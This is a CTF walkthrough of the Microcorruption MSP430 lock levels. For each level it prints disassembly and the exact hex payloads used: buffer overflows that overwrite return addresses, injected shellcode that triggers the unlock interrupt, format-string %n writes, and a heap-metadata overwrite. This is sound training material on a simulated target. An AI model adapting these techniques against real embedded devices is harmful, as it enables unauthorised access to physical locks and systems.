
The following is a walkthrough series on the [Microcorruption Embedded Security CTF](https://microcorruption.com/login), which has you debugging an embedded system running on the msp430 architecture. For these labs I used the manual provided for the fictional lock which we are debugging, as well as the MSP430x2xx family users guide. This is still a work in progress; I made the mistake of switching to primarilly physical notes partway through these labs, so I'm still gathering and organizing them as I find the time. I also need to review some of the later labs in order to better understand them.

### Tutorial and Level 1 (New Orleans)

The tutorial level essentially just gets you familiar with the debugger that you will be using through the rest of the levels. The debugger is very intuitive and easy to use, plus you can toggle a minimal mode which can eliminate some peripheral distractions. The debugger includes the disassembly of the program, a register window, a memory view, a console, and a window that displays the current instruction.

After skimming through the functions of the first tutorial I came across create\_password fairly quickly.

    
        447e <create_password>
    
        447e:  3f40 0024      mov	#0x2400, r15
    
        4482:  ff40 5f00 0000 mov.b	#0x5f, 0x0(r15)
    
        4488:  ff40 7a00 0100 mov.b	#0x7a, 0x1(r15)
    
        448e:  ff40 4500 0200 mov.b	#0x45, 0x2(r15)
    
        4494:  ff40 2a00 0300 mov.b	#0x2a, 0x3(r15)
    
        449a:  ff40 5a00 0400 mov.b	#0x5a, 0x4(r15)
    
        44a0:  ff40 4100 0500 mov.b	#0x41, 0x5(r15)
    
        44a6:  ff40 5c00 0600 mov.b	#0x5c, 0x6(r15)
    
        44ac:  cf43 0700      mov.b	#0x0, 0x7(r15)
    
        44b0:  3041           ret  
      

This is clearly placing a number of ascii codes into r15, and then tops it off with a null-byte. \`\_zE\*ZA\\\` is the converted character sequence, and we solve the lab if we use it as input.

### Sydney

There is no longer a create\_password function in this level. There is still a check\_password function, though...

    
          448a <check_password>
          448a:  bf90 3955 0000 cmp	#0x5539, 0x0(r15)
          4490:  0d20           jnz	$+0x1c
          4492:  bf90 2f21 0200 cmp	#0x212f, 0x2(r15)
          4498:  0920           jnz	$+0x14
          449a:  bf90 5e3f 0400 cmp	#0x3f5e, 0x4(r15)
          44a0:  0520           jne	#0x44ac <check_password+0x22>
          44a2:  1e43           mov	#0x1, r14
          44a4:  bf90 5a35 0600 cmp	#0x355a, 0x6(r15)
          44aa:  0124           jeq	#0x44ae <check_password+0x24>
          44ac:  0e43           clr	r14
          44ae:  0f4e           mov	r14, r15
          44b0:  3041           ret
      

You can see that values are being checked two bytes at a time. The ascii codes drawn from these comparisons convert to 9U/!^?Z5, which is our password.

### Hanoi

The following information is given at the start of the level:

_LockIT Pro Hardware Security Module 1 stores the login password, ensuring users can not access the password through other means. The LockIT Pro can send the LockIT Pro HSM-1 a password, and the HSM will return if the password is correct by setting a flag in memory._

So, the password is sent to a module that we presumably have no access to, and a flag is set after the module performs the comparison, which the main program uses to determine if the password was correct. Here is the login function...

    
          4520 <login>
          4520:  c243 1024      mov.b	#0x0, &0x2410
          4524:  3f40 7e44      mov	#0x447e "Enter the password to continue.", r15
          4528:  b012 de45      call	#0x45de <puts>
          452c:  3f40 9e44      mov	#0x449e "Remember: passwords are between 8 and 16 characters.", r15
          4530:  b012 de45      call	#0x45de <puts>
          4534:  3e40 1c00      mov	#0x1c, r14
          4538:  3f40 0024      mov	#0x2400, r15
          453c:  b012 ce45      call	#0x45ce <getsn>
          4540:  3f40 0024      mov	#0x2400, r15
          4544:  b012 5444      call	#0x4454 <test_password_valid>
          4548:  0f93           tst	r15
          454a:  0324           jz	$+0x8
          454c:  f240 2a00 1024 mov.b	#0x2a, &0x2410
          4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
          4556:  b012 de45      call	#0x45de <puts>
          455a:  f290 0100 1024 cmp.b	#0x1, &0x2410
          4560:  0720           jne	#0x4570 <login+0x50>
          4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
          4566:  b012 de45      call	#0x45de <puts>
          456a:  b012 4844      call	#0x4448 <unlock_door>
          456e:  3041           ret
          4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
          4574:  b012 de45      call	#0x45de <puts>
          4578:  3041           ret
          

I stepped through this and other functions a few times as I wanted to get a clear understanding of what they were doing. However, I did notice that the conditional jump simply checks whether the value at address 2410 is equal to 0x01. Our own password is stored at address 2400. So, if you simply need to enter a sequence of enough bytes such that the address at 2410 has the value 0x01.

### Cusco

Now we are informed that the developers have "improved the security of the lock by removing a conditional flag that could accidentally get set by passwords that were too long."

Overlong inputs are still accepted, however the region where the flag is set is no longer accessible to us. We can, however, overwrite a return address.

          4430:   1f83 cf43 0024 fa23 b012 0045 32d0 f000   ...C.$.#...E2...
      

The address at 443c is a ret to the stop\_prog\_exec function, and this is a region that we can overwrite. So, we can just write 16 bytes, followed by 0x4644, and we solve the lab, as the address of the unlock\_door function is at 0x4446.

### Reykjavik

Now we are told that "this release contains military-grade encryption so users can be confident that the passwords they enter can not be read from memory". So, we should check the encryption mechanism in place with this release. There is an enc function that performs some XOR and AND operations, so this must be the "military grade encryption" that the release notes talk about.

Here is a loop in enc:

      `448e:  0d43           clr	r13       4490:  cd4d 7c24      mov.b r13, 0x247c(r13)       4494:  1d53           inc	r13       4496:  3d90 0001      cmp	#0x100, r13       449a:  fa23           jne	#0x4490   Then later in the function, another loop occurs and performs operations on the memory copied by the prior loop. So what I'm thinking is that the encryption occurs only after the unencrypted data had been placed into memory temporarily.  And this is the memory region after the two loops that is called after after the password is entered                  0b12 0412 0441 2452 3150 e0ff 3b40 2045                 073c 1b53 8f11 0f12 0312 b012 6424 2152                 6f4b 4f93 f623 3012 0a00 0312 b012 6424                 2152 3012 1f00 3f40 dcff 0f54 0f12 2312                 b012 6424 3150 0600 b490 5dc9 dcff 0520                 3012 7f00 b012 6424 2153 3150 2000 3441                 3b41 3041 1e41         The following is the opcodes above run through the disassembler. The fact that it ends with a ret makes me think that this is the right section, since the instructions do have to return from a call.               0b12           push	r11         0412           push	r4         0441           mov	sp, r4         2452           add	#0x4, r4         3150 e0ff      add	#0xffe0, sp         3b40 2045      mov	#0x4520, r11         073c           jmp	$+0x10         1b53           inc	r11         8f11           sxt	r15         0f12           push	r15         0312           push	#0x0         b012 6424      call	#0x2464         2152           add	#0x4, sp         6f4b           mov.b	@r11, r15         4f93           tst.b	r15         f623           jnz	$-0x12         3012 0a00      push	#0xa         0312           push	#0x0         b012 6424      call	#0x2464         2152           add	#0x4, sp         3012 1f00      push	#0x1f         3f40 dcff      mov	#0xffdc, r15         0f54           add	r4, r15         0f12           push	r15         2312           push	#0x2         b012 6424      call	#0x2464         3150 0600      add	#0x6, sp         b490 5dc9 dcff cmp	#0xc95d, -0x24(r4)         0520           jnz	$+0xc         3012 7f00      push	#0x7f         b012 6424      call	#0x2464         2153           incd	sp         3150 2000      add	#0x20, sp         3441           pop	r4         3b41           pop	r11         3041           ret       Also, while the instructions that are being executed are not in the programs disassembly, they are automatically translated in the current instruction window of the debugger. This is a much more reliable method of getting the instruction, though we can only look at one instruction at a time. The following instruction:                b490 5dc9 dcff cmp	#0xc95d, -0x24(r4)       Performs a comparison on our input, which is at 0x43fe-0x24, where r4 is at 43fe. So if we just enter 5dc9 as our hex-encoded input, the comparison checks out, and we get access.  ### Whitehorse  Message for this level:  "LockIT Pro Hardware Security Module 2 stores the login password, ensuring users can not access the password through other means. The LockIT Pro can send the LockIT Pro HSM-2 a password, and the HSM will directly send the correct unlock message to the LockIT Pro Deadbolt if the password is correct, otherwise no action is taken."  It sounds like we will not have access to the functionality that interfaces with the door, and we definitely will not have access to the password in memory. We can also submit overlong input, making it likely that this will be a memory corruption vulnerability.  0x7f is the interrupt code that directly communicates with the lock. In previous versions this was used to access the deadbolt only after the password was checked. If we can, then, we should try to cause an interrupt with the 7f flag set.  It seems we can overwrite code with out input. So I used the following instructions                 3012 7f00 push #0x7f           b012 3245 call #0x4532         So we just overwrite however many bytes we need to get to the memory region that is executed, and insert the above opcodes (as 3245b0127f003012) in order to unlock the door.  I accidentally did this wrong but it still worked. Since I placed the opcode for the call to the interrupt first, that was executed first, but the 7f from the intended first opcode was enough places away from the sp at that time that the first instruction of the interrupt (mov 0x2(sp), r14) still put 7f into the register that I wanted it to go into.  ### Johannesburg  The release notes are that "a firmware update rejects passwords which are too long", and "this lock is attached the the LockIT Pro HSM-1".  A section of the login function that seems to be of interest           4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15     4574:  b012 f845      call	#0x45f8 <puts>     4578:  f190 da00 1100 cmp.b	#0xda, 0x11(sp)     457e:  0624           jeq	#0x458c <login+0x60>     4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15     4584:  b012 f845      call	#0x45f8 <puts>     4588:  3040 3c44      br	#0x443c <__stop_progExec__>     458c:  3150 1200      add	#0x12, sp     4590:  3041           ret         cmp.b #0xda, 0x11(sp) is what determines whether the password is going to be too long, so we simply need to make sure the byte at that offset (0x11) is 0xda, then we will be able to return from the function properly even with an overlong password, that will overwrite the return value of that very function. So, I'm going to try writing 20 bytes, followed by 4644 (the addr of the unlock_door function is 4446). I was wrong in where I thought the stack pointer originally was. It is at 43fe during the ret, whereas I thought it was at 4440. So only 18 bytes are needed, followed by 4644.  ### Montevideo  Here we are only told that much of the code has been rewritten, and that the lock uses the HSM-2, so we will not have a direct interface with the lock. Going through the functions, again there is a login function and a conditional_unlock_door function. Conditional unlock door is where the interrupt to communicate with the HSM occurs. The login function calls strcpy and memset before calling the unlock_door function           44f4:  3150 f0ff      add	#0xfff0, sp     44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15     44fc:  b012 b045      call	#0x45b0 <puts>     4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15     4504:  b012 b045      call	#0x45b0 <puts>     4508:  3e40 3000      mov	#0x30, r14     450c:  3f40 0024      mov	#0x2400, r15     4510:  b012 a045      call	#0x45a0 <getsn>     4514:  3e40 0024      mov	#0x2400, r14     4518:  0f41           mov	sp, r15     451a:  b012 dc45      call	#0x45dc <strcpy>     451e:  3d40 6400      mov	#0x64, r13     4522:  0e43           clr	r14     4524:  3f40 0024      mov	#0x2400, r15     4528:  b012 f045      call	#0x45f0 <memset>     452c:  0f41           mov	sp, r15     452e:  b012 4644      call	#0x4446 <conditional_unlock_door>     4532:  0f93           tst	r15     4534:  0324           jz	#0x453c <login+0x48>     4536:  3f40 c544      mov	#0x44c5 "Access granted.", r15     453a:  023c           jmp	#0x4540 <login+0x4c>     453c:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15     4540:  b012 b045      call	#0x45b0 <puts>     4544:  3150 1000      add	#0x10, sp     4548:  3041           ret         Our input is immediately placed into 2400. After out input is copied with the strcpy function, it is cleared. Once again we can overwrite the stack pointer after the copy. This opcode calls the interrupt:               b012 4c45       This pushes 0x7f onto the stack               3012 7f00        But really, you only need to access 0x7f through a stack pointer offset 0x2(sp). 4c45b0127f preceded by 16 garbage bytes will jump to the interrupt, and 7f will be used as the flag for the HSM-2, unlocking the deadbolt.  ### Santa Cruz  Release notes state that "this is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected". This version is connected to the hsm-1 instead of the hsm-2. In addition, this version takes both a username and a password. After a brief skimming, functions of interest are login, main, test_username_and_password_valid, and unlock_door.  Interestingly, with a massive username input and an adequate length password input, the program determines that the password length is too short.  Since there is an unlock_door function, my first thought was that we are supposed to bypass the length checks that are in place, then overwrite some memory to return to unlock_door. Sure enough, the variable that stores the min and max length are overwriteable. Using this we can manipulate the length check and overwrite a return address to unlock_door. Our input after the copy is stored at 0x43a2. 0x43cc is the address that we want to inject into. The input I used was:  4141414141414141414141414141414141017d + 30303030303030303030303030303030303030303030304a444a44  ### Addis Ababa  Now something else is done to ensure that passwords cannot be too long, usernames are printed back after input, and this version is using the HSM-1. The length of our input is actually limited now, so no more overwriting memory with overlong input. test_password_valid and unlock_door are functions to note. It also seems that printf is called, where previous versions used puts, so it's worth checking for a format string bug.  Sure enough, submitting %% into the input only outputs a single %, indicating that a format string vulnerability is present.  The following formula allows us to modify memory:  address to write to + ascii bytes + 256e256e  983e41414141256e256e is the input I used to solve the lab.  ### Novosibirsk  The release notes for this version are vague, basically saying that HSM-2 is used, and that "new features were added".  printf is called again, and submitting %% outputs only %, so we are dealing with another format string vulnerability. In addition, we are allowed to input an absurd amount of data. The HSM-2 is being used, however it might still be possible to push an argument onto the stack that will interface with the deadbolt directly, if that functionality is still present.  3012 7f00 is the opcode for push 0x7f, but I can only control a single byte. Or I should say, I can control multiple bytes, but they can only be the same value. For example, 50016001414141414141414141256e256e will write 0xd to 0150 and 0160. This is the instruction that provides the flag for the HSM-2 in in conditional_unlock_door...                 44c6: 3012 7e00 push	#0x7e         I attempted to place 0x7f at 44c8, and this ultimately worked. My final input was  c844 + A*125 + 256e (any 125 ascii bytes would work, as what matters is the quantity)  ### Algiers  We now have an account manager associated with the lock, which uses a seperate module to authorize accounts. The details of this system are ultimately not important. Scrolling through the code we can see that the lock calls malloc and free, suggesting that there could be some sort of heap-based vulnerability in this version. Here is a snapshot of the heap memory after using some generic inputs...                 2400:   0824 0010 0000 0000 0824 1e24 2100 7573   .$.......$.$!.us                                                                                                                                                                                                                                                                                     2410:   6572 6e61 6d65 0000 0000 0000 0000 0824   ername.........$                                                                                                                2420:   0824 c21f 7061 7373 776f 7264 0000 0000   .$..password....                                                                                                                 2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........           After some dissection of the heap chunks and the malloc and free functions, we can determine what is going on. A chunk on this heap has the following headers, in order: a pointer to the previous chunk, a pointer to the next chunk, and the size of the chunk, where the LSB of the size header also serves as a flag to indicate whether a chunk is in use. Free will move some pointers around and adjust the size+flag accordingly if chunks are empty.  As far as our input goes, we can submit past the bounds of the allocated data section, allowing us to overwrite the header contents of the subsequent chunk from where our data is stored. As you can see above, this means that we can overwrite the headers of the chunk that stores our password with arbitrary data. Now the problem is figuring out how we can overwrite data in such a way that we can hijack the execution flow. Assuming we have &next, &prev, and the size flag; *prev will be overwritten, prev[2] will become &next, next[0] is overwritten to point to prev, and prev[4] will be set to an adjusted size flag.  Now, it's hard to overwrite the stack pointer to point to a section of code we want to return to, because the areas that we try and jump to will be modified due free ovewriting several bytes. However, the function that we want to jump to, unlock_door, is held in memory immediately after free. It would be much easier to just ovewrite the return instruction at the end of free, so that exection continues right into unlock_door. My first thought was just to overwrite ret with a nop, but the opcode for nop is 0343, and we need to use something that could pass for an alligned address. Instead I overwrote the address of the ret instruction using a random address that doesn't hold any data that I care about, and which also translates to an instruction that doesn't do anything in this context, 4404 (rrc.b r4). This is the input I ultimately used to solve the lab:  41414141414141414141414141414141440462450000`